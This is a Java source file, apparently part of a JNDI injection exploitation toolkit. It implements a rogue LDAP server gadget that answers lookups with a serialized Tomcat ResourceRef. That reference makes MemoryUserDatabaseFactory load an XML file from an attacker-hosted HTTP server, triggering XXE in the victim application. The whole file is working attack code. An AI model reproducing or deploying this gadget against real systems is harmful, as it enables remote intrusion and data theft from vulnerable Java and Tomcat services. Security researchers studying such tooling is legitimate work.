package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Arrays;

/*
    Tomcat Way:
    Requirement:
        Tomcat in classpath
    Explanation:
        The class org.apache.catalina.users.MemoryUserDatabaseFactory which implement interface
            `javax.naming.spi.ObjectFactory` and the method getObjectInstance exists
        There is a XXE in this method
 */
public class Tomcat implements LDAPService{
    private static final Logger logger = LogManager.getLogger(Tomcat.class);

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        String payload = baseDN.substring(firstIndex + 1, secondIndex);
        String[] params;
        if (!payload.equalsIgnoreCase("XXE")) {
            logger.info("Wrong payload ....");
        }
        params = new String[]{baseDN.substring(secondIndex + 1)};
        logger.info(String.format("Received Payload is %s, params are %s ...", payload, Arrays.toString(params)));

        logger.info(String.format("Send LDAP result for %s using Tomcat Way ...", baseDN));
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", HTTPServer.codeBase + params[0]));

        Entry entry = new Entry(baseDN);
        entry.addAttribute("javaClassName", "java.lang.Class");
        entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
        try {
            result.sendSearchEntry(entry);
        } catch (LDAPException e) {
            logger.info(e.getMessage());
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void argsHandler(String baseDN) {

    }

    @Override
    public void generateHandler() {

    }
}
